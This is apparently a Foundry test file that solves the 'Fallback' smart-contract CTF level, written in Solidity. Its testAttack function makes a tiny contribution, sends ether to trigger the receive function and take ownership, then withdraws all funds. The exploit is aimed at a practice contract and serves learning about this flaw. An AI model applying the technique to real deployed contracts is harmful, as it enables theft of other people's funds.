// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1-Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallbackCTF;

    function setUp() public {
        fallbackCTF = new Fallback();
    }

    function testAttack() public {
        // contribute small amount
        fallbackCTF.contribute{value: 0.0001 ether}();

        // trigger receive function & become owner
        address(fallbackCTF).call{value: 1 ether}("");

        // check if attacker is owner
        assertEq(fallbackCTF.owner(), address(this));

        // withdraw all funds
        fallbackCTF.withdraw();
    }

    receive() external payable {}
}
